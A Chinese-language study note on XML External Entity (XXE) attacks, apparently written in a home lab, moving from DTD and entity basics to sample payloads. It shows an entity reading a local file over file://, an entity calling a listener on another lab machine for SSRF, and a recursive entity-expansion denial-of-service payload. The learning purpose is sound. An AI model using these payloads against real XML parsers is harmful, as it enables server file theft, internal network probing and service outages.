# xxe学习记录
## 1.xml基础  
####1.1  xml-dtd  
	<?xml version="1.0"?>   
	<!DOCTYPE note [  
    <!ELEMENT note (to,from,heading,body)>  
    <!ELEMENT to (#PCDATA)>  
    <!ELEMENT from (#PCDATA)>  
    <!ELEMENT heading (#PCDATA)>  
    <!ELEMENT body (#PCDATA)>  
    <!ENTITY entity "entity_value">  
	]>  
	<note>  
	<to>George</to>  
	<from>John</from>  
	<heading>Reminder</heading>  
	<body>Don't forget the meeting!</body>  
	&entity;  
	</note>    

XML 可扩展标记语言，被设计用来传输和存储数据。
可扩展既是他能拥有无限多个标记。  
通过自定义文档类型和实体来定义标记。  
> XML 文档的语法约束：DTD (Document Type
Definition 文档类型定义)

	<!DOCTYPE note [  
    <!ELEMENT note (to,from,heading,body)>  
    <!ELEMENT to (#PCDATA)>  
    <!ELEMENT from (#PCDATA)>  
    <!ELEMENT heading (#PCDATA)>  
    <!ELEMENT body (#PCDATA)>  
    <!ENTITY entity "entity_value">  
	]>  

比如这一段就定义了标签  
```note  to  from  heading  body```  
然后这一段就可以调用这一段标签  

	<note>    
	  <to>George</to>
	  <from>John</from>    
	  <heading>Reminder</heading>    
	  <body>Don't forget the meeting!</body>    
	  &entity;    
	</note>  
####1.2 xml-实体引用  
在 xml 内部：
 ```<!ENTITY 实体名称 "实体的值">
DTD例子：  

	<!ENTITY writer "Bill Gates">  
	//XML 引用实体:&writer;
外部实体声明&引用  
外部DTD(实体声明):  

	<!ENTITY 实体名称 "实体的值">
在 xml 内部（外部实体引用）：
	
	<!ENTITY 实体名称 SYSTEM "URI/URL">
	//这个很重要，在之后的攻击测试里面会用到
	或者
	<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
## 2. xxe  
####2.1  外部实体引用
xxe可以引用外部实体，通过  

	<!ENTITY 实体名称 SYSTEM "URI/URL">
可以读取本地文件 
本地测试:  
![](http://i.imgur.com/1q84kWZ.png)  
Doctype里面的定义不会展示在里游览器中，实体note标签下的东西展示出来  
我们来看下语句  

	<!ENTITY xxe SYSTEM "file:///C:/11111.txt">
引用实体xxe，xxe的值是外部实体file:///C:/11111.txt  
这里的file协议读取C盘下面的11111.txt文件  
这里如果在一个web应用里面存在xxe，那么就可以对服务器主机任意文件读取  
当然这个实验的时候踩到的一个坑就是xml解释器的问题，试了很多浏览器，最后在ie6上面得到了预期回显  
####2.2  ssrf  
xxe可以引用外部实体，通过  

	<!ENTITY 实体名称 SYSTEM "URI/URL">
这里是可以通过url请求来获取值得，这就满足了ssrf的攻击模式  
本地测试:  
![](http://i.imgur.com/g8koU0P.png)  
![](http://i.imgur.com/PWAJ6TP.png)  
![](http://i.imgur.com/7C4tJpw.png)  
这里可以看到，我们冲虚拟机192.168.141.128里面   

	<!ENTITY xxe SYSTEM "http://192.168.141.129:1234">  
去访问kali的1234端口  
然后kali的1234端口监听，监听到了数据  
另外请求外部志愿还有一种方式：直接使用DOCTYPE  
##3  DDos
因为在dtd里面可以对实体反复引用  
	
	<?xml version="1.0" encoding="utf-8" standalone="no" ?>
	<!DOCTYPE note [
	<!ENTITY xxe "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx">
	<!ENTITY xxe1 "&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;">
	<!ENTITY xxe2 "&xxe1;&xxe1;&xxe1;&xxe1;&xxe1;&xxe1;&xxe1;">
	...
	...
	]>
	<note>
	    &xxe;
	</note>
可以想一想，这样地柜调用上一级，呈指数倍数增长，xxe10的数据量会有多大？  
##4  参数实体
##5  通过 Xinclude 包含外部资源
